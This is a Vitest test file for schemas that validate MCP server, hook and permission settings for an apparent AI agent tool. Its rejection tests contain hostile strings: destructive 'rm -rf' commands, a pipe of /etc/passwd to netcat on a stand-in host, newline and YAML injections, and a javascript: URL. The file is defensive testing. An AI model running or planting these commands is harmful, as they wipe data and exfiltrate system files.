import { describe, it, expect } from 'vitest';
import {
  HookEntryInputSchema,
  HooksRecordSchema,
  McpServerInputSchema,
  PermissionListSchema,
} from '../../../src/mcp/schemas.js';

describe('McpServerInputSchema', () => {
  it('accepts a stdio server with command + args + env', () => {
    const r = McpServerInputSchema.safeParse({
      type: 'stdio',
      command: 'node',
      args: ['server.js'],
      env: { FOO: 'bar' },
    });
    expect(r.success).toBe(true);
  });

  it('accepts an absolute path command', () => {
    expect(
      McpServerInputSchema.safeParse({ command: '/usr/local/bin/python3', args: [] }).success,
    ).toBe(true);
  });

  it('accepts npx style command', () => {
    expect(
      McpServerInputSchema.safeParse({ command: 'npx', args: ['-y', 'some-pkg@1.2.3'] }).success,
    ).toBe(true);
  });

  it('accepts URL transport with headers', () => {
    expect(
      McpServerInputSchema.safeParse({
        type: 'sse',
        url: 'https://mcp.example.com/v1',
        headers: { Authorization: 'Bearer xxx' },
      }).success,
    ).toBe(true);
  });

  it('rejects command with semicolon (shell separator)', () => {
    const r = McpServerInputSchema.safeParse({ command: 'node ; rm -rf /', args: [] });
    expect(r.success).toBe(false);
  });

  it('rejects command with backtick (command substitution)', () => {
    expect(McpServerInputSchema.safeParse({ command: 'echo `id`' }).success).toBe(false);
  });

  it('rejects command with $() substitution', () => {
    expect(McpServerInputSchema.safeParse({ command: 'echo $(id)' }).success).toBe(false);
  });

  it('rejects command with pipe', () => {
    expect(McpServerInputSchema.safeParse({ command: 'cat /etc/passwd | nc evil 9' }).success).toBe(
      false,
    );
  });

  it('rejects command with redirection', () => {
    expect(McpServerInputSchema.safeParse({ command: 'echo > /etc/passwd' }).success).toBe(false);
  });

  it('rejects command with embedded newline', () => {
    expect(McpServerInputSchema.safeParse({ command: 'node\nrm -rf /' }).success).toBe(false);
  });

  it('rejects unknown top-level field (strict)', () => {
    const r = McpServerInputSchema.safeParse({ command: 'node', secretField: 'x' });
    expect(r.success).toBe(false);
  });

  it('rejects env with invalid key shape', () => {
    expect(McpServerInputSchema.safeParse({ command: 'node', env: { '1BAD': 'x' } }).success).toBe(
      false,
    );
  });

  it('rejects URL with non-http(s) protocol', () => {
    expect(
      McpServerInputSchema.safeParse({ type: 'sse', url: 'javascript:alert(1)' }).success,
    ).toBe(false);
  });

  it('rejects args array longer than 100', () => {
    expect(
      McpServerInputSchema.safeParse({ command: 'node', args: Array(101).fill('x') }).success,
    ).toBe(false);
  });

  it('accepts the documented optional fields (description, cwd, disabled, timeout)', () => {
    expect(
      McpServerInputSchema.safeParse({
        type: 'stdio',
        command: 'node',
        args: [],
        env: {},
        description: 'Local server',
        cwd: '/tmp/server',
        disabled: false,
        timeout: 30_000,
      }).success,
    ).toBe(true);
  });

  it('rejects a non-numeric timeout', () => {
    expect(
      McpServerInputSchema.safeParse({ command: 'node', timeout: 'x' as unknown as number })
        .success,
    ).toBe(false);
  });
});

describe('HookEntryInputSchema', () => {
  it('accepts flat form with matcher + command', () => {
    expect(HookEntryInputSchema.safeParse({ matcher: 'Bash', command: 'echo hi' }).success).toBe(
      true,
    );
  });

  it('accepts nested form with hooks array', () => {
    expect(
      HookEntryInputSchema.safeParse({
        matcher: 'Bash',
        hooks: [{ type: 'command', command: 'echo hi' }],
      }).success,
    ).toBe(true);
  });

  it('rejects matcher containing newline (H2 attack vector)', () => {
    const r = HookEntryInputSchema.safeParse({
      matcher: 'Bash\nrm -rf $HOME',
      command: 'echo safe',
    });
    expect(r.success).toBe(false);
  });

  it('rejects matcher containing carriage return', () => {
    expect(
      HookEntryInputSchema.safeParse({ matcher: 'Bash\rrm -rf', command: 'echo' }).success,
    ).toBe(false);
  });

  it('rejects entry without matcher', () => {
    expect(HookEntryInputSchema.safeParse({ command: 'echo' } as never).success).toBe(false);
  });

  it('rejects entry without command or prompt (flat)', () => {
    expect(HookEntryInputSchema.safeParse({ matcher: 'Bash' }).success).toBe(false);
  });

  it('rejects nested entry with empty hooks array', () => {
    expect(HookEntryInputSchema.safeParse({ matcher: 'Bash', hooks: [] }).success).toBe(false);
  });

  it('rejects nested hook callable without command/prompt', () => {
    expect(
      HookEntryInputSchema.safeParse({
        matcher: 'Bash',
        hooks: [{ type: 'command' }],
      }).success,
    ).toBe(false);
  });

  it('accepts a flat prompt-only entry (no command)', () => {
    expect(
      HookEntryInputSchema.safeParse({
        matcher: 'Bash',
        type: 'prompt',
        prompt: 'Review the command output',
      }).success,
    ).toBe(true);
  });
});

describe('HooksRecordSchema', () => {
  it('accepts a typical PreToolUse map', () => {
    const r = HooksRecordSchema.safeParse({
      PreToolUse: [{ matcher: 'Bash', command: 'echo' }],
    });
    expect(r.success).toBe(true);
  });

  it('accepts mixed flat + nested entries', () => {
    expect(
      HooksRecordSchema.safeParse({
        PreToolUse: [
          { matcher: 'Bash', command: 'echo' },
          { matcher: 'Write', hooks: [{ type: 'command', command: 'lint' }] },
        ],
      }).success,
    ).toBe(true);
  });

  it('rejects entries-per-event over 100', () => {
    expect(
      HooksRecordSchema.safeParse({
        PreToolUse: Array(101).fill({ matcher: 'Bash', command: 'echo' }),
      }).success,
    ).toBe(false);
  });
});

describe('PermissionListSchema', () => {
  it('accepts bare tool names', () => {
    expect(PermissionListSchema.safeParse(['Bash', 'Read', 'Edit']).success).toBe(true);
  });

  it('accepts Tool(matcher) form', () => {
    expect(
      PermissionListSchema.safeParse(['Bash(npm test:*)', 'WebFetch(https://example.com/*)'])
        .success,
    ).toBe(true);
  });

  it('rejects entry with embedded newline (YAML injection vector)', () => {
    expect(PermissionListSchema.safeParse(['Bash(*)\nmalicious_key: value']).success).toBe(false);
  });

  it('rejects entry with disallowed shape', () => {
    expect(PermissionListSchema.safeParse(['; rm -rf /']).success).toBe(false);
    expect(PermissionListSchema.safeParse(['Bash | evil']).success).toBe(false);
  });

  it('rejects empty entry', () => {
    expect(PermissionListSchema.safeParse(['']).success).toBe(false);
  });
});
